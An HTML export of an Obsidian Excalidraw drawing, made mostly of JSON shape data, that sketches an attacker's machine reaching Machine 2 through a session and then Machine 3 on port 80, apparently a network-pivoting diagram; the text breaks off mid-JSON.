<style> .container {font-family: sans-serif; text-align: center;} .button-wrapper button {z-index: 1;height: 40px; width: 100px; margin: 10px;padding: 5px;} .excalidraw .App-menu_top .buttonList { display: flex;} .excalidraw-wrapper { height: 800px; margin: 50px; position: relative;} :root[dir="ltr"] .excalidraw .layer-ui__wrapper .zen-mode-transition.App-menu_bottom--transition-left {transform: none;} </style><script src="https://cdn.jsdelivr.net/npm/react@17/umd/react.production.min.js"></script><script src="https://cdn.jsdelivr.net/npm/react-dom@17/umd/react-dom.production.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@excalidraw/excalidraw@0/dist/excalidraw.production.min.js"></script><div id="Drawing_2024-10-09_2235.56.excalidraw.md1"></div><script>(function(){const InitialData={"type":"excalidraw","version":2,"source":"https://github.com/zsviczian/obsidian-excalidraw-plugin/releases/tag/2.5.1","elements":[{"type":"ellipse","version":1577,"versionNonce":1557090870,"index":"a0","isDeleted":false,"id":"lBo8ycKNQjrPrzllBz3Ah","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-247.34946989060973,"y":-187.05078555708423,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":1153110634,"groupIds":["oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2481,"versionNonce":1945943222,"index":"a1","isDeleted":false,"id":"VrQYt7UKdq2M-J6TH-70q","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-242.8243930346107,"y":-141.71069793957818,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1631663402,"groupIds":["IwPxAe3VaWWiGY5Ajywk5","goPgOUvmpuU6-LWN4La4Q","mjKqhs4WYRLq2p5R20OZj","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2048,"versionNonce":166704630,"index":"a2","isDeleted":false,"id":"4NWCLg0BbMiPseCI2m7Rz","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-241.85768634933902,"y":-141.41057163713745,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":913637354,"groupIds":["F1jz__0646EDhxfQ0GuXL","UVIWLyR7r7DOMHi0n_-HF","zdia_-81z1l2NYMDQetpU","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":1900,"versionNonce":1907459894,"index":"a3","isDeleted":false,"id":"p388wlxzwlQOTtClZjIXY","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-202.3430982791224,"y":-112.32762984467914,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":811692714,"groupIds":["xMk2s6GGMCp7_QEVXDr4W","jqU96RlO8a4fEsrLYuCIr","4tjltVGMh-A-70747kQ_7","RonCUbTv0I2lh2Wo73083","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1410,"versionNonce":1000812662,"index":"a4","isDeleted":false,"id":"v0bgkY84-xta1lcTsirTc","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-225.86084599518972,"y":-182.5718543165264,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":28413290,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2534,"versionNonce":597012918,"index":"a5","isDeleted":false,"id":"V4sn-zrn40ij3fxf4mcBS","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-239.25602608391728,"y":-156.8817837878925,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":1336954922,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2317,"versionNonce":614599414,"index":"a6","isDeleted":false,"id":"j313RElpNf14siWkCabeq","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-236.07420790209926,"y":-157.3271617331258,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1581824746,"groupIds":["gpHaH2e6u_CYk86AVJBNz","zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":922,"versionNonce":223427638,"index":"a7","isDeleted":false,"id":"3VZqT_cRG7i6oRw4d9L2A","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-213.80047796851477,"y":-123.07570393114534,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":1007013290,"groupIds":["zjGjyOd36L5upQ3UiSzSV","oVynU9VwKNAtuUH6Mco2m"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":121,"versionNonce":327697782,"index":"a8","isDeleted":false,"id":"eHx7oY7T","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-257.51647877375797,"y":-98.01847441472844,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":90.93992614746094,"height":25,"seed":1846708330,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 1","rawText":"Machine 1","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 1","autoResize":true,"lineHeight":1.25},{"type":"ellipse","version":1756,"versionNonce":1754015414,"index":"a9","isDeleted":false,"id":"wJFYLf0Cdxf2hWCekxZOn","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-79.14947294236754,"y":-178.65076114302173,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":473557802,"groupIds":["dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"},{"id":"B0AxgmqD1ZeHvtqXrtUTB","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2659,"versionNonce":196532854,"index":"aA","isDeleted":false,"id":"eEMoF-6aUamqVdikr8jew","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-74.6243960863685,"y":-133.31067352551568,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1021769194,"groupIds":["ppqmeqcWif1eCeOd3k-tN","82hZTWqFVpE88CL-Fop9O","k9FpwtiI_MdA2RiVnLIqk","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2226,"versionNonce":1746934710,"index":"aB","isDeleted":false,"id":"nLtNrJDF0TmAeT7zNFY79","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-73.65768940109683,"y":-133.01054722307495,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":1092921514,"groupIds":["VsZfXiBM_1-ggcXIWJ0DW","jo7vpQcEnc8apQRmowo4I","jrzxsWPlIHjz5gPLhqJjW","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":2078,"versionNonce":5190902,"index":"aC","isDeleted":false,"id":"Gxb4KeXfPuwRqK2KNgwtb","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-34.1431013308802,"y":-103.92760543061664,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":1084097386,"groupIds":["pzN--t5eWVYU7-ANu1Kmo","tRLPUvqzoXYqrNa1AN8DT","8huBh3gAvVblIMiHJWa6r","PLZE__sZGpBZfbDz-q0QY","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1588,"versionNonce":231286326,"index":"aD","isDeleted":false,"id":"2SUkWEGShQH95kOeeZ6zY","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-57.66084904694753,"y":-174.1718299024639,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":631113258,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2712,"versionNonce":1366486902,"index":"aE","isDeleted":false,"id":"baSrfci9v_EaMksImQUUe","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-71.05602913567509,"y":-148.48175937383,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":1494200554,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2495,"versionNonce":663851190,"index":"aF","isDeleted":false,"id":"2cEIFCPm3MdX4ibqcLz1h","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-67.87421095385707,"y":-148.9271373190633,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":1853752234,"groupIds":["eZELvLxVjQu8nDa7x7Xwa","XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1100,"versionNonce":466225654,"index":"aG","isDeleted":false,"id":"87dgYpojC1QvClyYBOA7j","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":-45.60048102027258,"y":-114.67567951708284,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":1343487594,"groupIds":["XqaMZFO1VyBuDAHW3tpeg","dD_0C2_98EHbduFD0n7dP"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"ellipse","version":1732,"versionNonce":2099338038,"index":"aH","isDeleted":false,"id":"9EvO88zdRznRBG4-9PI96","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":64.05053926466366,"y":-174.65076114302173,"strokeColor":"transparent","backgroundColor":"transparent","width":63.26598833721928,"height":76.464646698774,"seed":1788649770,"groupIds":["oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[{"id":"B0AxgmqD1ZeHvtqXrtUTB","type":"arrow"}],"updated":1728524181231,"link":null,"locked":false},{"type":"line","version":2636,"versionNonce":203457974,"index":"aI","isDeleted":false,"id":"q_7t9Oh7cbv12ZhaHhWlq","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":68.57561612066269,"y":-129.31067352551568,"strokeColor":"#495057","backgroundColor":"#ced4da","width":52.89727725669225,"height":36.31614507333556,"seed":1501752298,"groupIds":["JOnKfDiSDiNMZMAdqAZy7","JeRYxj_F1F1LOGzBP2PzC","clxcVFqo0j4Bofa-3H-gu","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[0.11421566210438161,9.422956987448126],[40.65546973254628,29.719459738145176],[52.39760703096317,21.40602267804661],[52.89727725669225,12.297327209220706],[13.57926092607591,-6.5966853351903865],[0,0]]},{"type":"line","version":2203,"versionNonce":1555193590,"index":"aJ","isDeleted":false,"id":"Uf4DuEYICqcHGQKazg3qZ","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":69.54232280593436,"y":-129.01054722307495,"strokeColor":"#495057","backgroundColor":"#ced4da","width":51.2343362446793,"height":20.383549292462444,"seed":315743914,"groupIds":["nfQnmsel273prixkk5jIy","5VMGUyVf8ja7hgv2FWFAQ","UR10VPrMA7Zb2ybe4Lo0x","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[39.04910936654609,20.383549292462444],[51.2343362446793,11.872445964798771]]},{"type":"line","version":2055,"versionNonce":137826358,"index":"aK","isDeleted":false,"id":"DUE12qTuG2THgVcg0gi8b","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":109.056910876151,"y":-99.92760543061664,"strokeColor":"#495057","backgroundColor":"#ced4da","width":0.177311235298596,"height":8.031860957629895,"seed":322206058,"groupIds":["l1JJS4TV7-iuQyOY_cGAP","Qstj9iHrGJ5pkYR7QPsVl","3KU_Qz1BBU9McYJ70KZYq","2XgSFOX8Wa-_k0aU4cJXh","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[-0.177311235298596,-8.031860957629895]]},{"type":"line","version":1565,"versionNonce":1519622518,"index":"aL","isDeleted":false,"id":"wIxsadqAhNTC8aSBLe2a2","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":85.53916316008366,"y":-170.17182990246388,"strokeColor":"#495057","backgroundColor":"#ced4da","width":38.299120234602924,"height":51.041055718475036,"seed":167099434,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[17.29472140762482,2.309384164223502],[35.47653958944193,12.763929618768088],[38.299120234602924,28.77565982404758],[36.9354838709678,42.14809384164346],[28.438416422287446,51.041055718475036],[20.703812316715812,46.62756598240503],[1.158357771260853,19.809384164223502],[0.24926686216986127,3.218475073314039]]},{"type":"line","version":2689,"versionNonce":1527577270,"index":"aM","isDeleted":false,"id":"_CQRoMZwcwqrhiIllc9DB","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":72.1439830713561,"y":-144.48175937383,"strokeColor":"#495057","backgroundColor":"#ced4da","width":46.86901140734767,"height":54.3714311178362,"seed":83928810,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[4.311701847418056,13.761389868409811],[36.672357030754256,28.290893113945458],[46.4915051662324,19.50728732212292],[46.86901140734767,-7.857569074843923],[37.76870538120877,-16.736013442588842],[13.340736029639045,-26.080538003890744],[1.8028021661685354,-21.15287874969945],[0,0]]},{"type":"line","version":2472,"versionNonce":1615344630,"index":"aN","isDeleted":false,"id":"LAJ91Ez1Fu15CpGaEYFiI","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":75.32580125317412,"y":-144.9271373190633,"strokeColor":"#495057","backgroundColor":"#343a40","width":39.772727272725206,"height":45.505050505050804,"seed":484456874,"groupIds":["5U2rdjNoar9GhwrMxk0W2","REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[3.623737373738095,11.56565656565499],[29.29292929293024,23.58585858585775],[39.64646464646603,18.686868686866546],[39.772727272725206,-5.075757575758416],[31.742424242424477,-14.065656565657264],[11.21212121212102,-21.919191919193054],[1.5151515151524109,-17.777777777778738],[0,0]]},{"type":"line","version":1077,"versionNonce":608847158,"index":"aO","isDeleted":false,"id":"tsEG0RYzULr6T9J3KT6ut","fillStyle":"solid","strokeWidth":1,"strokeStyle":"solid","roughness":0,"opacity":100,"angle":0,"x":97.59953118675861,"y":-110.67567951708284,"strokeColor":"#495057","backgroundColor":"#495057","width":8.055555555555657,"height":6.203703703703468,"seed":549418090,"groupIds":["REnUd-o-sUR5lmnaeun8T","oXLnBsgVIqcOeVNvZy4Xu"],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"startBinding":null,"endBinding":null,"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":null,"points":[[0,0],[8.023431594860085,4.032501889644209],[8.055555555555657,6.203703703703468],[0.15306122448964743,2.3658352229781485],[0,0]]},{"type":"text","version":119,"versionNonce":1484271222,"index":"aP","isDeleted":false,"id":"hY8cnnJy","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-103.78642964045719,"y":-88.51844389715032,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":96.39993286132812,"height":25,"seed":1114199850,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 2","rawText":"Machine 2","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 2","autoResize":true,"lineHeight":1.25},{"type":"text","version":151,"versionNonce":966193078,"index":"aQ","isDeleted":false,"id":"gIXoCfGw","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":27.88353038151547,"y":-90.9184377936347,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":94.55992126464844,"height":25,"seed":1112072682,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 3","rawText":"Machine 3","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 3","autoResize":true,"lineHeight":1.25},{"type":"arrow","version":426,"versionNonce":130037110,"index":"aR","isDeleted":false,"id":"kkjr-97saqojG71P16_Y6","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-186.9536554993701,"y":-145.81252381254495,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":99.56789069740412,"height":2.013143180902972,"seed":459871402,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524222447,"link":null,"locked":false,"startBinding":{"elementId":"iDtGWVI8","focus":2.1634133673600826,"gap":15.267163297877744,"fixedPoint":null},"endBinding":{"elementId":"wJFYLf0Cdxf2hWCekxZOn","focus":0.179279621365162,"gap":8.738749707404057,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[99.56789069740412,-2.013143180902972]],"elbowed":false},{"type":"arrow","version":389,"versionNonce":584490858,"index":"aS","isDeleted":false,"id":"B0AxgmqD1ZeHvtqXrtUTB","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-1.185245597746416,"y":-143.714402860689,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":63.334710183076766,"height":0.32219046187323386,"seed":796192618,"groupIds":[],"frameId":null,"roundness":{"type":2},"boundElements":[],"updated":1728524181359,"link":null,"locked":false,"startBinding":{"elementId":"wJFYLf0Cdxf2hWCekxZOn","focus":-0.08004342243940464,"gap":14.787377158195302,"fixedPoint":null},"endBinding":{"elementId":"9EvO88zdRznRBG4-9PI96","focus":0.20371971304660566,"gap":2.502129574757337,"fixedPoint":null},"lastCommittedPoint":null,"startArrowhead":null,"endArrowhead":"arrow","points":[[0,0],[63.334710183076766,-0.32219046187323386]],"elbowed":false},{"type":"text","version":276,"versionNonce":418005878,"index":"aT","isDeleted":false,"id":"3243Q9Ph","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-253.38645100276187,"y":-69.7184866217597,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":87.63990783691406,"height":25,"seed":1924624938,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524181231,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Attacker","rawText":"Attacker","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Attacker","autoResize":true,"lineHeight":1.25},{"type":"text","version":215,"versionNonce":633809974,"index":"aU","isDeleted":false,"id":"iDtGWVI8","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-171.68649220149234,"y":-184.6189920159356,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":88.83990478515625,"height":25,"seed":404462826,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[{"id":"kkjr-97saqojG71P16_Y6","type":"arrow"}],"updated":1728524222446,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Session 1","rawText":"Session 1","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Session 1","autoResize":true,"lineHeight":1.25},{"type":"text","version":208,"versionNonce":1610217910,"index":"aW","isDeleted":false,"id":"hyxE3s4E","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":49.22003936767578,"y":-204.76873016357422,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":79.97993469238281,"height":25,"seed":1867503606,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524217227,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Port 80","rawText":"Port 80","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Port 80","autoResize":true,"lineHeight":1.25},{"type":"text","version":287,"versionNonce":289870122,"index":"aY","isDeleted":false,"id":"2kwrfjBC","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":-246.68997955322266,"y":-218.3687515258789,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":77.57992553710938,"height":25,"seed":998232682,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524229970,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Port 33","rawText":"Port 33","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Port 33","autoResize":true,"lineHeight":1.25},{"type":"text","version":209,"versionNonce":1393147882,"index":"aZ","isDeleted":true,"id":"0E6gp4W0","fillStyle":"solid","strokeWidth":2,"strokeStyle":"solid","roughness":1,"opacity":100,"angle":0,"x":35.62006378173828,"y":-208.76876068115234,"strokeColor":"#1e1e1e","backgroundColor":"transparent","width":94.55992126464844,"height":25,"seed":1564055414,"groupIds":[],"frameId":null,"roundness":null,"boundElements":[],"updated":1728524224273,"link":null,"locked":false,"fontSize":20,"fontFamily":5,"text":"Machine 3","rawText":"Machine 3","textAlign":"left","verticalAlign":"top","containerId":null,"originalText":"Machine 